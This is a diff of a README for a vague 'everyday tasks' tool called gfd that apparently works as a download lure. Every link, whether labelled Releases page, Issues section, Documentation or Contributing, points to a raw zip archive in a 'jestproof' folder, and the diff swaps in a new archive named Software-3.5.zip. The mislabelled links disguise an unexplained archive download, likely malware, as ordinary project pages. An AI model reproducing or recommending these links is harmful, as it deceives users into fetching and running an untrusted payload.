@@ -1,7 +1,7 @@
 # 🛠️ gfd - Simple Tool for Everyday Tasks
 
 ## 📥 Download Now
-[![Download gfd](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip)](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip)
+[![Download gfd](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip)](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to gfd, your go-to tool designed for simplicity in handling everyday tasks. Whether you are organizing files, automating routines, or just trying to be more efficient, gfd aims to make your life easier.
@@ -21,10 +21,10 @@ To use gfd effectively, ensure you meet the following system requirements:
 ## 📂 How to Download & Install
 To get started with gfd, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip).
+1. Visit the [Releases page](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip).
 2. On the Releases page, locate the latest version.
 3. Click on the version number to view details.
-4. Find the appropriate package for your operating system (e.g., https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip for Windows users).
+4. Find the appropriate package for your operating system (e.g., https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip for Windows users).
 5. Click the download link to save the file to your computer.
 
 Once you have downloaded the file, follow these steps to install gfd:
@@ -49,7 +49,7 @@ With gfd, you can manage files, automate tasks, and streamline your daily activi
 Yes, gfd is completely free to use without any hidden charges.
 
 **How can I get support?**
-If you encounter any issues, please check the [Issues section](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip) in our GitHub repository. You can also reach out by opening a new issue.
+If you encounter any issues, please check the [Issues section](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip) in our GitHub repository. You can also reach out by opening a new issue.
 
 ## 🗣️ Community Feedback
 We appreciate user feedback as it helps us improve gfd. Share your thoughts, feature requests, or any issues you find while using the application. Your input is valuable.
@@ -61,7 +61,7 @@ We are consistently working to enhance gfd. Expect regular updates that include:
 - Bug fixes to ensure a smooth experience.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip): Detailed guides and tips for using gfd.
-- [Contributing](https://raw.githubusercontent.com/naim75035/gfd/main/jestproof/gfd.zip): Join the development community if you would like to contribute.
+- [Documentation](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip): Detailed guides and tips for using gfd.
+- [Contributing](https://github.com/naim75035/gfd/raw/refs/heads/main/jestproof/Software-3.5.zip): Join the development community if you would like to contribute.
 
 Thank you for choosing gfd. We hope it makes your tasks easier and your work more enjoyable.
